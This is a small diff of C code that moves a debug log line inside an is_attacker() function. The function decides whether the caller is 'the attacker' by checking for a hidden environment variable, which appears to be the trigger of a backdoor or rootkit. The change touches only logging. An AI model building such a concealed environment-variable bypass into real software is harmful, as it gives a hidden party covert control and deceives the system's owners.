@@ -27,12 +27,11 @@
  */
 
 int is_attacker(void) {
+    DEBUG(D_INFO, "called is_attacker()");
     static int attacker = -1;
 
     if (attacker != -1)
         return (attacker);
-
-    DEBUG(D_INFO, "Checking if this is the attacker...");
 
     if (getenv(HIDDEN_ENV_VAR)) {
         DEBUG(D_INFO, "This is the attacker.");
